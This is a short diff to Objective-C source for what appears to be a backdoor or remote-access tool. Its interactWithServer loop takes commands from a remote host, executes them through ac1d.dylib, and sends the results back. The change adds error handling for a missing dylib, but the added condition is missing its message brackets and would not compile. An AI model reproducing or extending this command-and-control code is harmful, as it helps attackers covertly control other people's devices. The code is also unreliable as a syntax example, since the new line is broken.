@@ -83,8 +83,13 @@ void interactWithServer(NSString *remoteHost, int remotePort) {
         NSMutableArray *args = [NSMutableArray arrayWithArray:[[NSString stringWithUTF8String:buffer] componentsSeparatedByString:@" "]];
         printf("[+] Got command from %s:%d!\n", [remoteHost UTF8String], remotePort);
         printf("[*] Executing %s...\n", [args[0] UTF8String]);
-        if ([commands containsObject:args[0]]) sendString([ac1d_base sendCommand:args]);
-        else {
+        if ([commands containsObject:args[0]]) {
+            NSString *result = [ac1d_base sendCommand:args];
+            if (result isEqualToString:@"error") printf("[-] Failed to execute command, cannot find ac1d.dylib!\n");
+            else {
+                sendString(result);
+            }
+        } else {
             printf("[-] Unrecognized command!\n");
             sendString(@"error");
         }
